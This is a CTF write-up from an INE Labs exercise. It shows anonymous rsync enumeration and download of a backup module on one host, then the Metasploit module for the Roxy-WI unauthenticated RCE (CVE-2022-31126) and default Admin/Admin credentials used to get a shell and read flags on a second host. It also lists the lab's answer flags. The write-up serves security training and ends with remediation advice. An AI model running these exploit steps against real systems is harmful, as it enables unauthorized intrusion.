---
title: "Metasploit Framework CTF 2"
description: "Two-target CTF: enumerating an exposed RSYNC server to read its banner and loot a backup module (flags 1-2), then exploiting a Roxy-WI unauthenticated command-injection RCE (CVE-2022-31126) on the second host and reading a scheduled cron job for the remaining flags."
date: 2025-11-14
platform: "INE Labs"
difficulty: "Medium"
tags: ["RSYNC", "Roxy-WI", "CVE-2022-31126", "Metasploit", "Cron", "CTF", "Linux"]
cover: "./photo16.png"
---

# CTF Report: The Metasploit Framework II

**Classification:** Host & Network Penetration Testing / The Metasploit Framework<br>
**Target 1:** target1.ine.local (192.185.144.3) — RSYNC (873)<br>
**Target 2:** target2.ine.local (192.185.144.4) — Ubuntu, Apache 2.4.52, Roxy-WI<br>
**Objective:** Capture four flags.

## 1. Executive Summary

Target 1 exposes an **RSYNC** daemon whose banner leaks the first flag and whose backup
module holds a spreadsheet with the second. Target 2 runs **Roxy-WI**, vulnerable to an
**unauthenticated command-injection RCE** (CVE-2022-31126); exploiting it gives a `www-data`
shell, and the third and fourth flags are found on the filesystem and in a scheduled cron
job.

## 2. Target 1 — RSYNC

```bash
ping -c 4 target1.ine.local
db_nmap -sV 192.185.144.3
services
```

![Ping target 1](./photo1.png)

![MSF global variables](./photo2.png)

![Nmap scan](./photo3.png)

Port 873 runs **rsync (protocol 31)**.

![services — rsync on 873](./photo4.png)

### Flag 1 — RSYNC Banner

Listing the rsync modules reveals a module name that embeds the flag.

```bash
rsync rsync://192.185.144.3/
# backupwscohen   FLAG1_7027f793950b47d497624c68fa45521c
```

![rsync banner — flag 1](./photo5.png)

> **Flag 1:** `7027f793950b47d497624c68fa45521c`

### Flag 2 — RSYNC Files

Downloading the `backupwscohen` module's contents.

```bash
rsync -av rsync://192.185.144.3/backupwscohen ./loot
```

![Downloading the backup files](./photo6.png)

The second flag is inside the XLSX spreadsheet.

```
Flag 2: 3fea50b35c734b08a6726a9e646589f4
```

![Flag 2 in the XLSX file](./photo7.png)

## 3. Target 2 — Roxy-WI

```bash
ping -c 4 target2.ine.local
db_nmap -sV 192.185.144.4
services
```

![Ping target 2](./photo8.png)

![MSF global variables (target 2)](./photo9.png)

![Nmap scan (1)](./photo10.png)

Ports 80/443 run **Apache httpd 2.4.52**.

![services — Apache 2.4.52](./photo11.png)

Browsing the site downloads a Python file; the webapp is reachable and accepts `Admin/Admin`.

![Python file from the web server](./photo12.png)

![Accessing the webapp](./photo13.png)

![Login with Admin/Admin](./photo14.png)

The application is **Roxy-WI**.

![Roxy-WI identified](./photo15.png)

### Flag 3 — Roxy-WI RCE

```bash
search roxy-wi
use exploit/linux/http/roxy_wi_exec     # Roxy-WI < 6.1.1.0 unauth RCE (CVE-2022-31126)
set RHOSTS 192.185.144.4
exploit
```

![Roxy-WI module (1)](./photo16.png)

![Exploit launched (2)](./photo17.png)

A `www-data` shell opens; the third flag is in `/`.

```bash
shell
cat /flag3.txt
# 0d9efbce31df41f695090e94b0c566ce
```

![Shell on target 2 (1)](./photo18.png)

![Flag 3 in / (2)](./photo19.png)

> **Flag 3:** `0d9efbce31df41f695090e94b0c566ce`

### Flag 4 — Scheduled Job

Inspecting the scheduled jobs in `/etc/cron.d/` reveals a cron entry that echoes the flag.

```bash
cd /etc/cron.d
cat *
# * * * * * www-data echo "FLAG4_797617b1a61b4343a6e5b8d248cd655e"
```

![Flag 4 in /etc/cron.d/](./photo20.png)

> **Flag 4:** `797617b1a61b4343a6e5b8d248cd655e`

## 4. Remediation Recommendations

1. **Lock down RSYNC** — require authentication, disable anonymous module listing, and never
   expose backup data (or flag-bearing banners) publicly.
2. **Patch Roxy-WI** to ≥ 6.1.1.0 (CVE-2022-31126) and change default credentials
   (`Admin/Admin`).
3. **Run the webapp with least privilege** and avoid storing secrets in world-readable cron
   jobs / filesystem roots.
4. **Restrict and monitor** both services; alert on command-injection patterns.
